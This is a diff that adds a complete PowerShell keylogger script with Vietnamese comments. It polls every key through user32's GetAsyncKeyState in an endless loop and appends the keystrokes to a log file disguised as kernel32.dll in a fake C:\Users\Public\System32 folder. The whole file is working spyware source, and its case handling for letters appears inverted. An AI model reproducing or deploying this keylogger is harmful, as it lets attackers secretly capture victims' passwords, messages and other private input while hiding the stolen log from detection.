@@ -1,0 +1,90 @@
+# ============================================================
+# KEYLOGGER - Capture tất cả phím (chữ, số, đặc biệt)
+# Ghi vào: C:\Users\Public\System32\kernel32.dll
+# ============================================================
+
+$PublicDir = "C:\Users\Public\System32"
+mkdir $PublicDir -Force -EA SilentlyContinue
+$LogFile = "$PublicDir\kernel32.dll"
+
+# Load user32.dll để gọi GetAsyncKeyState
+if (-not ("KeyLogger" -as [type])) {
+    Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+}
+
+# Map phím đặc biệt
+$specialKeys = @{
+    8="[BACKSPACE]"; 9="[TAB]"; 13="[ENTER]`n"; 16="[SHIFT]"; 17="[CTRL]"; 18="[ALT]"
+    20="[CAPS]"; 27="[ESC]"; 32="[SPACE]"; 33="[PGUP]"; 34="[PGDN]"
+    35="[END]"; 36="[HOME]"; 37="[LEFT]"; 38="[UP]"; 39="[RIGHT]"; 40="[DOWN]"
+    45="[INS]"; 46="[DEL]"
+    112="[F1]"; 113="[F2]"; 114="[F3]"; 115="[F4]"; 116="[F5]"; 117="[F6]"
+    118="[F7]"; 119="[F8]"; 120="[F9]"; 121="[F10]"; 122="[F11]"; 123="[F12]"
+}
+
+# Bảng ký tự khi giữ Shift cho phím số
+$shiftNumbers = @(')','!','@','#','$','%','^','&','*','(')
+
+# Hàm trả về text của phím
+function Get-KeyText($vk) {
+    if ($specialKeys.ContainsKey($vk)) { return $specialKeys[$vk] }
+
+    # A-Z
+    if ($vk -ge 65 -and $vk -le 90) {
+        $shift = [KeyLogger]::GetAsyncKeyState(16) -band 0x8000
+        $caps  = [KeyLogger]::GetAsyncKeyState(20) -band 0x8000
+        $ch = [char]$vk
+        if (($shift -ne 0) -xor ($caps -ne 0)) { return $ch.ToString().ToLower() }
+        return $ch.ToString()
+    }
+
+    # 0-9 (row)
+    if ($vk -ge 48 -and $vk -le 57) {
+        $shift = [KeyLogger]::GetAsyncKeyState(16) -band 0x8000
+        if ($shift -ne 0) { return $shiftNumbers[$vk - 48] }
+        return [char]$vk
+    }
+
+    # Numpad 0-9
+    if ($vk -ge 96 -and $vk -le 105) { return [string]($vk - 96) }
+
+    # Numpad ops
+    switch ($vk) {
+        106 { return "*" }
+        107 { return "+" }
+        109 { return "-" }
+        110 { return "." }
+        111 { return "/" }
+    }
+
+    return ""
+}
+
+# Theo dõi phím đã nhấn để tránh repeat
+$pressed = @{}
+
+# Vòng lặp chính
+while ($true) {
+    for ($vk = 8; $vk -le 222; $vk++) {
+        $state = [KeyLogger]::GetAsyncKeyState($vk)
+        if ($state -band 0x8000) {
+            if (-not $pressed.ContainsKey($vk)) {
+                $pressed[$vk] = $true
+                $txt = Get-KeyText $vk
+                if ($txt -ne "") {
+                    [System.IO.File]::AppendAllText($LogFile, $txt)
+                }
+            }
+        } else {
+            if ($pressed.ContainsKey($vk)) { $pressed.Remove($vk) }
+        }
+    }
+    Start-Sleep -Milliseconds 30
+}
